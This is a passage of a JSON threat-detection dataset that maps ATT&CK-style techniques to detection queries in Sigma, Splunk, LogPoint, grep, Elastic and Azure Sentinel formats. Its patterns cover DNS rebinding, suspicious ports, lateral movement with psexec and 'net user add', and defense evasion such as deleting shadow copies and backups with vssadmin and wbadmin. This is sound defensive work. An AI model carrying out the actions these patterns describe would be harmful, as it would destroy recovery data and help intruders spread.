[\"4443\", \"2448\", \"8143\", \"1777\", \"1443\", \"243\", \"65535\", \"13506\", \"3360\", \"200\", \"198\", \"49180\", \"13507\", \"6625\", \"4444\", \"4438\", \"1904\", \"13505\", \"13504\", \"12102\", \"9631\", \"5445\", \"2443\", \"777\", \"13394\", \"13145\", \"12103\", \"5552\", \"3939\", \"3675\", \"666\", \"473\", \"5649\", \"4455\", \"4433\", \"1817\", \"100\", \"65520\", \"1960\", \"1515\", \"743\", \"700\", \"14154\", \"14103\", \"14102\", \"12322\", \"10101\", \"7210\", \"4040\", \"9943\"])  -((Image=\"*\\\\\\\\Program Files*\" OR (DestinationIp IN [\"10.*\", \"192.168.*\", \"172.16.*\", \"172.17.*\", \"172.18.*\", \"172.19.*\", \"172.20.*\", \"172.21.*\", \"172.22.*\", \"172.23.*\", \"172.24.*\", \"172.25.*\", \"172.26.*\", \"172.27.*\", \"172.28.*\", \"172.29.*\", \"172.30.*\", \"172.31.*\", \"127.*\"] DestinationIsIpv6=\"false\"))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*3)(?=.*true)(?=.*(?:.*4443|.*2448|.*8143|.*1777|.*1443|.*243|.*65535|.*13506|.*3360|.*200|.*198|.*49180|.*13507|.*6625|.*4444|.*4438|.*1904|.*13505|.*13504|.*12102|.*9631|.*5445|.*2443|.*777|.*13394|.*13145|.*12103|.*5552|.*3939|.*3675|.*666|.*473|.*5649|.*4455|.*4433|.*1817|.*100|.*65520|.*1960|.*1515|.*743|.*700|.*14154|.*14103|.*14102|.*12322|.*10101|.*7210|.*4040|.*9943))))(?=.*(?!.*(?:.*(?:.*(?:.*.*\\\\Program Files.*|.*(?:.*(?=.*(?:.*10\\\\..*|.*192\\\\.168\\\\..*|.*172\\\\.16\\\\..*|.*172\\\\.17\\\\..*|.*172\\\\.18\\\\..*|.*172\\\\.19\\\\..*|.*172\\\\.20\\\\..*|.*172\\\\.21\\\\..*|.*172\\\\.22\\\\..*|.*172\\\\.23\\\\..*|.*172\\\\.24\\\\..*|.*172\\\\.25\\\\..*|.*172\\\\.26\\\\..*|.*172\\\\.27\\\\..*|.*172\\\\.28\\\\..*|.*172\\\\.29\\\\..*|.*172\\\\.30\\\\..*|.*172\\\\.31\\\\..*|.*127\\\\..*))(?=.*false))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible DNS Rebinding\nid: eb07e747-2552-44cd-af36-b659ae0958e4\nstatus: experimental\ndescription: Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL >100. (DNS-record\n    will saved in host cache for a while TTL).\ndate: 2019/10/25\nmodified: 2019/11/13\nauthor: Ilyas Ochkov, oscd.community\nreferences:\n    - https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325\ntags:\n    - attack.command_and_control\n    - attack.t1043\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    dns_answer:\n        EventID: 22\n        QueryName: '*'\n        QueryStatus: '0' \n    filter_int_ip:\n        QueryResults|startswith: \n            - '(::ffff:)?10.'\n            - '(::ffff:)?192.168.'\n            - '(::ffff:)?172.16.'\n            - '(::ffff:)?172.17.'\n            - '(::ffff:)?172.18.'\n            - '(::ffff:)?172.19.'\n            - '(::ffff:)?172.20.'\n            - '(::ffff:)?172.21.'\n            - '(::ffff:)?172.22.'\n            - '(::ffff:)?172.23.'\n            - '(::ffff:)?172.24.'\n            - '(::ffff:)?172.25.'\n            - '(::ffff:)?172.26.'\n            - '(::ffff:)?172.27.'\n            - '(::ffff:)?172.28.'\n            - '(::ffff:)?172.29.'\n            - '(::ffff:)?172.30.'\n            - '(::ffff:)?172.31.'\n            - '(::ffff:)?127.'        \n    timeframe: 30s\n    condition: (dns_answer and filter_int_ip) and (dns_answer and not filter_int_ip) | count(QueryName) by ComputerName > 3\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible DNS Rebinding\nid: eb07e747-2552-44cd-af36-b659ae0958e4\nstatus: experimental\ndescription: Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL >100. (DNS-record\n    will saved in host cache for a while TTL).\ndate: 2019/10/25\nmodified: 2019/11/13\nauthor: Ilyas Ochkov, oscd.community\nreferences:\n    - https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325\ntags:\n    - attack.command_and_control\n    - attack.t1043\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    dns_answer:\n        EventID: 22\n        QueryName: '*'\n        QueryStatus: '0' \n    filter_int_ip:\n        QueryResults|startswith: \n            - '(::ffff:)?10.'\n            - '(::ffff:)?192.168.'\n            - '(::ffff:)?172.16.'\n            - '(::ffff:)?172.17.'\n            - '(::ffff:)?172.18.'\n            - '(::ffff:)?172.19.'\n            - '(::ffff:)?172.20.'\n            - '(::ffff:)?172.21.'\n            - '(::ffff:)?172.22.'\n            - '(::ffff:)?172.23.'\n            - '(::ffff:)?172.24.'\n            - '(::ffff:)?172.25.'\n            - '(::ffff:)?172.26.'\n            - '(::ffff:)?172.27.'\n            - '(::ffff:)?172.28.'\n            - '(::ffff:)?172.29.'\n            - '(::ffff:)?172.30.'\n            - '(::ffff:)?172.31.'\n            - '(::ffff:)?127.'        \n    timeframe: 30s\n    condition: (dns_answer and filter_int_ip) and (dns_answer and not filter_int_ip) | count(QueryName) by ComputerName > 3\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-DNS-Rebinding <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible DNS Rebinding\",\\n    \"description\": \"Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL >100. (DNS-record will saved in host cache for a while TTL).\",\\n    \"tags\": [\\n      \"attack.command_and_control\",\\n      \"attack.t1043\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"22\\\\\" AND QueryName.keyword:* AND QueryStatus:\\\\\"0\\\\\" AND QueryResults.keyword:(\\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?10.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?192.168.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.16.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.17.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.18.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.19.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.20.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.21.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.22.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.23.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.24.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.25.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.26.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.27.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.28.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.29.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.30.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.31.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?127.*) AND (EventID:\\\\\"22\\\\\" AND QueryName.keyword:* AND QueryStatus:\\\\\"0\\\\\") AND (NOT (QueryResults.keyword:(\\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?10.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?192.168.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.16.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.17.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.18.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.19.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.20.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.21.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.22.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.23.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.24.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.25.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.26.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.27.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.28.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.29.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.30.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.31.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?127.*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30s\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"22\\\\\" AND QueryName.keyword:* AND QueryStatus:\\\\\"0\\\\\" AND QueryResults.keyword:(\\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?10.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?192.168.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.16.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.17.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.18.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.19.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.20.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.21.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.22.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.23.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.24.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.25.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.26.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.27.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.28.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.29.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.30.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.31.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?127.*) AND (EventID:\\\\\"22\\\\\" AND QueryName.keyword:* AND QueryStatus:\\\\\"0\\\\\") AND (NOT (QueryResults.keyword:(\\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?10.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?192.168.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.16.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.17.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.18.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.19.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.20.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.21.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.22.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.23.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.24.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.25.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.26.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.27.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.28.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.29.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.30.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?172.31.* OR \\\\\\\\(\\\\\\\\:\\\\\\\\:ffff\\\\\\\\:\\\\\\\\)?127.*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          },\\n          \"aggs\": {\\n            \"by\": {\\n              \"terms\": {\\n                \"field\": \"ComputerName.keyword\",\\n                \"size\": 10,\\n                \"order\": {\\n                  \"_count\": \"desc\"\\n                },\\n                \"min_doc_count\": 4\\n              },\\n              \"aggs\": {\\n                \"agg\": {\\n                  \"terms\": {\\n                    \"field\": \"QueryName.keyword\",\\n                    \"size\": 10,\\n                    \"order\": {\\n                      \"_count\": \"desc\"\\n                    },\\n                    \"min_doc_count\": 4\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.aggregations.by.buckets.0.agg.buckets.0.doc_count\": {\\n        \"gt\": 3\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible DNS Rebinding\\'\",\\n        \"body\": \"Hits:\\\\n{{#aggregations.agg.buckets}}\\\\n {{key}} {{doc_count}}\\\\n\\\\n{{#by.buckets}}\\\\n-- {{key}} {{doc_count}}\\\\n{{/by.buckets}}\\\\n\\\\n{{/aggregations.agg.buckets}}\\\\n\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID=\"22\" QueryName=\"*\" QueryStatus=\"0\" (QueryResults=\"(::ffff:)?10.*\" OR QueryResults=\"(::ffff:)?192.168.*\" OR QueryResults=\"(::ffff:)?172.16.*\" OR QueryResults=\"(::ffff:)?172.17.*\" OR QueryResults=\"(::ffff:)?172.18.*\" OR QueryResults=\"(::ffff:)?172.19.*\" OR QueryResults=\"(::ffff:)?172.20.*\" OR QueryResults=\"(::ffff:)?172.21.*\" OR QueryResults=\"(::ffff:)?172.22.*\" OR QueryResults=\"(::ffff:)?172.23.*\" OR QueryResults=\"(::ffff:)?172.24.*\" OR QueryResults=\"(::ffff:)?172.25.*\" OR QueryResults=\"(::ffff:)?172.26.*\" OR QueryResults=\"(::ffff:)?172.27.*\" OR QueryResults=\"(::ffff:)?172.28.*\" OR QueryResults=\"(::ffff:)?172.29.*\" OR QueryResults=\"(::ffff:)?172.30.*\" OR QueryResults=\"(::ffff:)?172.31.*\" OR QueryResults=\"(::ffff:)?127.*\") (EventID=\"22\" QueryName=\"*\" QueryStatus=\"0\") NOT ((QueryResults=\"(::ffff:)?10.*\" OR QueryResults=\"(::ffff:)?192.168.*\" OR QueryResults=\"(::ffff:)?172.16.*\" OR QueryResults=\"(::ffff:)?172.17.*\" OR QueryResults=\"(::ffff:)?172.18.*\" OR QueryResults=\"(::ffff:)?172.19.*\" OR QueryResults=\"(::ffff:)?172.20.*\" OR QueryResults=\"(::ffff:)?172.21.*\" OR QueryResults=\"(::ffff:)?172.22.*\" OR QueryResults=\"(::ffff:)?172.23.*\" OR QueryResults=\"(::ffff:)?172.24.*\" OR QueryResults=\"(::ffff:)?172.25.*\" OR QueryResults=\"(::ffff:)?172.26.*\" OR QueryResults=\"(::ffff:)?172.27.*\" OR QueryResults=\"(::ffff:)?172.28.*\" OR QueryResults=\"(::ffff:)?172.29.*\" OR QueryResults=\"(::ffff:)?172.30.*\" OR QueryResults=\"(::ffff:)?172.31.*\" OR QueryResults=\"(::ffff:)?127.*\"))) | eventstats dc(QueryName) as val by ComputerName | search val > 3", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"22\" QueryName=\"*\" QueryStatus=\"0\" QueryResults IN [\"(::ffff:)?10.*\", \"(::ffff:)?192.168.*\", \"(::ffff:)?172.16.*\", \"(::ffff:)?172.17.*\", \"(::ffff:)?172.18.*\", \"(::ffff:)?172.19.*\", \"(::ffff:)?172.20.*\", \"(::ffff:)?172.21.*\", \"(::ffff:)?172.22.*\", \"(::ffff:)?172.23.*\", \"(::ffff:)?172.24.*\", \"(::ffff:)?172.25.*\", \"(::ffff:)?172.26.*\", \"(::ffff:)?172.27.*\", \"(::ffff:)?172.28.*\", \"(::ffff:)?172.29.*\", \"(::ffff:)?172.30.*\", \"(::ffff:)?172.31.*\", \"(::ffff:)?127.*\"] (event_id=\"22\" QueryName=\"*\" QueryStatus=\"0\")  -(QueryResults IN [\"(::ffff:)?10.*\", \"(::ffff:)?192.168.*\", \"(::ffff:)?172.16.*\", \"(::ffff:)?172.17.*\", \"(::ffff:)?172.18.*\", \"(::ffff:)?172.19.*\", \"(::ffff:)?172.20.*\", \"(::ffff:)?172.21.*\", \"(::ffff:)?172.22.*\", \"(::ffff:)?172.23.*\", \"(::ffff:)?172.24.*\", \"(::ffff:)?172.25.*\", \"(::ffff:)?172.26.*\", \"(::ffff:)?172.27.*\", \"(::ffff:)?172.28.*\", \"(::ffff:)?172.29.*\", \"(::ffff:)?172.30.*\", \"(::ffff:)?172.31.*\", \"(::ffff:)?127.*\"])) | chart count(QueryName) as val by ComputerName | search val > 3", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*22)(?=.*.*)(?=.*0)(?=.*(?:.*\\\\(::ffff:\\\\)?10\\\\..*|.*\\\\(::ffff:\\\\)?192\\\\.168\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.16\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.17\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.18\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.19\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.20\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.21\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.22\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.23\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.24\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.25\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.26\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.27\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.28\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.29\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.30\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.31\\\\..*|.*\\\\(::ffff:\\\\)?127\\\\..*))(?=.*(?:.*(?=.*22)(?=.*.*)(?=.*0)))(?=.*(?!.*(?:.*(?=.*(?:.*\\\\(::ffff:\\\\)?10\\\\..*|.*\\\\(::ffff:\\\\)?192\\\\.168\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.16\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.17\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.18\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.19\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.20\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.21\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.22\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.23\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.24\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.25\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.26\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.27\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.28\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.29\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.30\\\\..*|.*\\\\(::ffff:\\\\)?172\\\\.31\\\\..*|.*\\\\(::ffff:\\\\)?127\\\\..*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - Discovery", "command": "\\\\Windows\\\\.+\\\\net.exe|wmic.exe|\\\\Windows\\\\.+\\\\ipconfig.exe|nbtstat|tasklist.exe|systeminfo.exe", "name": null}, {"source": "SysmonHunter - Discovery", "command": "query\\\\Windows\\\\.+\\\\sc.exe", "name": null}, {"source": "SysmonHunter - Discovery", "command": "advfirewall\\\\Windows\\\\.+\\\\netsh.exe", "name": null}], "command_list": ["\\\\Windows\\\\.+\\\\net.exe|wmic.exe|\\\\Windows\\\\.+\\\\ipconfig.exe|nbtstat|tasklist.exe|systeminfo.exe", "query\\\\Windows\\\\.+\\\\sc.exe", "advfirewall\\\\Windows\\\\.+\\\\netsh.exe"], "technique_id": "C1004", "parsed_datasets": [{"SysmonHunter - C1004": {"phase": "Discovery", "query": [{"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\net.exe|wmic.exe|\\\\Windows\\\\.+\\\\ipconfig.exe|nbtstat|tasklist.exe|systeminfo.exe", "flag": "regex"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "query"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\sc.exe", "flag": "regex"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "advfirewall"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\netsh.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Discovery", "level": "medium"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - Authentication Package", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages", "name": null}, {"source": "SysmonHunter - Authentication Package", "command": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages", "name": null}], "command_list": ["\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages", "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"], "technique_id": "T1131", "parsed_datasets": [{"SysmonHunter - T1131": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"}}}, {"process": {"cmdline": {"pattern": "\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Authentication Packages"}}, "type": "process"}], "description": null, "name": "Authentication Package", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"*\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\*\")and (process_path !contains \"C:\\\\WINDOWS\\\\system32\\\\lsass.exe\"or process_path !contains \"C:\\\\Windows\\\\system32\\\\svchost.exe\"or process_path !contains \"C:\\\\Windows\\\\system32\\\\services.exe\")", "product": "Azure Sentinel", "name": "Authentication Package"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - Lateral Movement", "command": "nbtscan.exe|psexec", "name": null}, {"source": "SysmonHunter - Lateral Movement", "command": "net|user|add", "name": null}, {"source": "SysmonHunter - Lateral Movement", "command": "net|/add", "name": null}], "command_list": ["nbtscan.exe|psexec", "net|user|add", "net|/add"], "technique_id": "C1001", "parsed_datasets": [{"SysmonHunter - C1001": {"phase": "Lateral Movement", "query": [{"process": {"image": {"pattern": "nbtscan.exe|psexec"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "net|user|add", "op": "and"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "net|/add", "op": "and"}}, "type": "process"}], "description": null, "name": "Lateral Movement", "level": "high"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - IE DCOM Launch", "command": "-k|DcomLaunch\\\\Windows\\\\.+\\\\svchost.exe-Embedding\\Internet Explorer\\iexplore.exe", "name": null}], "command_list": ["-k|DcomLaunch\\\\Windows\\\\.+\\\\svchost.exe-Embedding\\Internet Explorer\\iexplore.exe"], "technique_id": "C1005", "parsed_datasets": [{"SysmonHunter - C1005": {"phase": "Execution", "query": [{"type": "procchain", "parent": {"cmdline": {"pattern": "-k|DcomLaunch", "op": "and"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\svchost.exe", "flag": "regex"}}, "child": {"cmdline": {"pattern": "-Embedding"}, "image": {"pattern": "\\Internet Explorer\\iexplore.exe"}}}], "description": null, "name": "IE DCOM Launch", "level": "medium"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - HTTP or HTTPS Communication", "command": "80|443", "name": null}], "command_list": ["80|443"], "technique_id": "C1006", "parsed_datasets": [{"SysmonHunter - C1006": {"phase": "Command and Control", "query": [{"type": "network", "network": {"rport": {"pattern": "80|443"}}}], "description": null, "name": "HTTP or HTTPS Communication", "level": "medium"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - Registry Execution", "command": "\\\\Windows\\\\.+\\\\reg.exe", "name": null}], "command_list": ["\\\\Windows\\\\.+\\\\reg.exe"], "technique_id": "C1000", "parsed_datasets": [{"SysmonHunter - C1000": {"phase": "Execution", "query": [{"process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\reg.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Registry Execution", "level": "medium"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "SysmonHunter - None", "command": "/dontLog:trueinetsrv\\appcmd.exe", "name": null}, {"source": "SysmonHunter - None", "command": "unload|detachfltmc.exe", "name": null}, {"source": "SysmonHunter - None", "command": "Delete|Shadowsvssadmin.exe", "name": null}, {"source": "SysmonHunter - None", "command": "deletewbadmin", "name": null}], "command_list": ["/dontLog:trueinetsrv\\appcmd.exe", "unload|detachfltmc.exe", "Delete|Shadowsvssadmin.exe", "deletewbadmin"], "technique_id": "C1003", "parsed_datasets": [{"SysmonHunter - C1003": {"phase": "Defense Evasion", "query": [{"process": {"cmdline": {"pattern": "/dontLog:true"}, "image": {"pattern": "inetsrv\\appcmd.exe"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "unload|detach"}, "image": {"pattern": "fltmc.exe"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "Delete|Shadows", "op": "and"}, "image": {"pattern": "vssadmin.exe"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "delete"}, "image": {"pattern": "wbadmin"}}, "type": "process"}], "description": null, "name": null, "level": "high"}}], 